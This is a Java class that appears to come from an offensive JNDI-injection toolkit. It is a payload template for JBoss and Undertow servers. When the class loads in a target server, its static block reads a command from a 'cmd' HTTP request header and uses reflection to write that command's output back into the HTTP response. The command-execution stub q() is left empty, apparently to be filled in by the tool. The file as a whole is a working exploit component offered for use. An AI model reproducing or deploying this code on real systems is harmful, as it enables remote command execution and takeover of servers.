package com.qi4l.jndi.template.echo;

public class JbossEcho {

    public static String CMD_HEADER = "cmd";

    static {
        try {
            Object req = javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            String cmd = getMethodAndInvoke(req, "getHeader", new Class[]{String.class}, new Object[]{CMD_HEADER}).toString();

            if (cmd != null && !cmd.isEmpty()) {
                java.io.ByteArrayOutputStream baos = q(cmd);

                try {
                    // 高版本底层是 undertow
                    Class.forName("io.undertow.servlet.spec.HttpServletRequestImpl");
                    Object               exchange = getMethodAndInvoke(req, "getExchange", new Class[]{}, new Object[]{});
                    java.io.OutputStream os       = (java.io.OutputStream) getMethodAndInvoke(exchange, "getOutputStream", new Class[]{}, new Object[]{});
                    os.write(baos.toByteArray());
                    os.close();
                } catch (ClassNotFoundException ignored) {
                    Object response = getMethodAndInvoke(req, "getResponse", new Class[]{}, new Object[]{});
                    if (response == null) {
                        java.lang.reflect.Field field = req.getClass().getDeclaredField("request");
                        field.setAccessible(true);
                        response = getMethodAndInvoke(field.get(req), "getResponse", new Class[]{}, new Object[]{});

                    }
                    Object writer = getMethodAndInvoke(response, "getWriter", new Class[]{}, new Object[]{});
                    getMethodAndInvoke(writer, "write", new Class[]{String.class}, new Object[]{baos.toString()});
                    getMethodAndInvoke(writer, "flush", new Class[]{}, new Object[]{});
                    getMethodAndInvoke(writer, "close", new Class[]{}, new Object[]{});
                }
            }
        } catch (Exception ignored) {
        }

    }

    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }

    public static java.lang.reflect.Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        java.lang.reflect.Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    public static Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            java.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null)
                return method.invoke(obj, parameters);
        } catch (Exception ignored) {
        }
        return null;
    }

}
